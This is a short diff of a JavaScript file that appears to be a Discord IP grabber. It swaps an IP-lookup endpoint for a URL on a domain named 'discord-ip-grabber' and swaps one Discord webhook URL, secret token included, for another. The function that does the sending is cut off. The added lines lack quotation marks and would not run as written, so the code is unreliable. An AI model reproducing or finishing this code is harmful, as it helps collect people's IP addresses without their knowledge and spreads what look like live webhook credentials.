@@ -1,8 +1,8 @@
 
-const ipifyAPI = "https://media.tenor.com/iZeeYFb9QlgAAAAj/benjammins-sybau.gif";
+const ipifyAPI = https://discord-ip-grabber-pn3o.vercel.app/
 
 
-const webhookURL = "https://discord.com/api/webhooks/1411508873847771319/LsmNaKWCF_OizGnUjiO0jOjBuUgpKkTs75Dfr9eJQBh0PyIL4-2t1Ue8X0kJbYW5vweB";
+const webhookURL = https://discord.com/api/webhooks/1411767526479761438/DJzmDBJArhp0ZrylHtbg4T_1h0FyQLJ_5YlFZa9UjZiPYZqbPchHOMGxj5RxBJA2ticd
 
 
 async function getIP() {
